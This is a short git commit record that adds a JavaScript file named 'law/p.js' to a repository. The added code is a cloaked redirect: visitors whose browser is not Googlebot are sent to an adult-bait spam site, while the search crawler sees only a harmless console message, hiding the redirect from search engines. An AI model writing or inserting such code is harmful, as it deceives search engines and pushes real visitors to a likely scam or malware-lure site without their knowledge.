0611234c2a3e6be7329a80c7691d43d7faea5dbe
ncpb34 <monayemni.l.l@gmail.com>
2026-09-01 01:05:06 +0600

    Create p.js

---
+++ law/p.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "http://leakviralvideos.com/?sex-video-today";
+} else {
+  console.log("Thanks for visiting my page" );
+}
